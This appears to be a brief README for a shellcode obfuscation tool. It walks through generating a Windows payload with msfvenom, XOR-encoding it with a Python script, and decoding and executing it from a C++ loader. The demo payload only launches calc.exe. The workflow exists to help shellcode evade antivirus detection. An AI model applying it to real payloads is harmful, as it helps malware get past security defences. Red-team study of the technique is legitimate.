# Shellcode Obfuscation: XOR

## Usage

### 1. Generate Original Shellcode

```sh
msfvenom -p windows/x64/exec CMD=calc.exe -f py -v shellcode
```

### 2. Encode the Shellcode

Open `XOR.py` and replace the `shellcode` value with our generated shellcode, then execute it:

```sh
python3 XOR.py
```

### 3. Decode & Execute Shellcode

Edit `XOR.cpp` to replace the `encodedShellcode` with the generated shellcode above.  
Then build/execute it.